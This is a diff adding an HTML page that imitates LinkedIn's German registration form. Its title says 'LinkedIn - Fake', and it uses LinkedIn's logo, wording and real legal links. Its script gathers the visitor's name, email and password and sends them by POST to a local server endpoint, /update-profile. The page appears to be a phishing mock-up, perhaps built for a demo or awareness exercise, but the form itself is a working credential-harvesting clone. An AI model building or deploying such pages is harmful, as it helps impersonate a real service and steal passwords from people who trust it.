@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="./linkedin-logo-2430.png">
+    <title>Anmelden | LinkedIn - Fake</title>
+    <script>
+        async function registerUser(){
+            const payload = {
+                vorname : document.getElementById("vorname").value,
+                nachname : document.getElementById("nachname").value,
+                email : document.getElementById("email").value,
+                passwort : document.getElementById("passwort").value
+            };
+            console.log(payload)
+            if(payload.vorname != "" && payload.nachname != "" && payload.email != "" && payload.passwort != ""){
+                const response = await fetch('http://localhost:3000/update-profile', {
+                    method: "POST",
+                    headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            }else{
+                alert("Bitte füllen Sie alle Felder aus!")
+            }
+           
+
+            
+            
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="/linkedin-logo.png" alt="LinkedIn Logo">
+        </div>
+        <div class="form-container">
+            <form>
+                <h1>Mit LinkedIn immer einen Schritt voraus </h1>
+                <p>Make the most of your professional life</p>
+                <div class="input-group">
+                    <input type="text" id="vorname" name="firstName" placeholder="Vorname" required>
+                    <input type="text" id="nachname" name="lastName" placeholder="Nachame" required>
+                </div>
+                <input type="email" id="email" name="email" placeholder="Email" required>
+                <input type="password" id="passwort" name="password" placeholder="Passwort" required>
+                <p>Durch Klicken auf „Zustimmen & anmelden“ stimmen 
+                    <a href="https://de.linkedin.com/legal/user-agreement?trk=registration-frontend_join-form-user-agreement">Sie der Nutzervereinbarung</a>, der 
+                    <a href="https://de.linkedin.com/legal/privacy-policy?trk=registration-frontend_join-form-privacy-policy">Datenschutzrichtlinie</a> und der 
+                    <a href="https://de.linkedin.com/legal/cookie-policy?trk=registration-frontend_join-form-cookie-policy">Cookie-Richtlinie</a> von LinkedIn zu.</p>
+                <button type="submit" onclick="registerUser()">Zustimmen & Anmelden</button>
+            </form>
+                <p>Bereits auf LinkedIn? <a href="#">Einloggen</a></p>
+        </div>
+    </div>
+</body>
+</html>
+
+
+
